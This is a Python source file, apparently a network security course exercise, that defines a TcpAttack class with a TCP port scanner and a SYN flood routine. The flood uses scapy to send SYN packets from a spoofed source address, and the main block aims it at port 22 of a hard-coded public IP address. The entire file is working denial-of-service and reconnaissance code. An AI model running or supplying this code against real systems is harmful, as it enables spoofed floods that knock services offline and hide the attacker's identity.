import sys, socket
import re
import os.path
import sys, socket
from scapy.all import *

class TcpAttack:
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP
        return
    
    def scanTarget(self, rangeStart, rangeEnd):

        # Copied from port_scan.py line 60
        FILEOUT = open('openports.txt', 'w')
        open_ports = []
        for testport in range(rangeStart, rangeEnd+1):                               
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)               
            sock.settimeout(0.1)                                                     
            try:                                                                     
                sock.connect((self.targetIP, testport))                            
                open_ports.append(testport)    
                
                # successful
                print('Succes for port %d\n', testport)
            except:
                # fail
                pass   
        
        for i in open_ports:
            FILEOUT.write("%s\n" % i)
        FILEOUT.close()
        return

    def attackTarget(self, port, numSyn):
        sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )               
        sock.settimeout(0.1)                                                     
        try:                                                                     
            sock.connect((self.targetIP, port))
            
            # successful connection

            # Copied from DoS5.py line 18
            for i in range(numSyn):                                                       
                IP_header = IP(src = self.spoofIP, dst = self.targetIP)                                
                TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)     
                packet = IP_header / TCP_header                                          
                try:                                                                     
                    send(packet)                                                   
                except Exception as e:  
                    # failed attack?                                                 
                    print(e, i)        
                    quit() 
            
            # successful attack
            return 1
        except Exception as e:
            # fail
            print(e, 'fail\n')
            return 0

if __name__ == '__main__':
    spoofIP = '10.1.2.3'
    targetIP = '128.46.144.123'
    rangeStart = 0
    rangeEnd = 30
    port = 22
    Tcp = TcpAttack(spoofIP, targetIP)
    #Tcp.scanTarget(rangeStart, rangeEnd)
    Tcp.attackTarget(port, 5)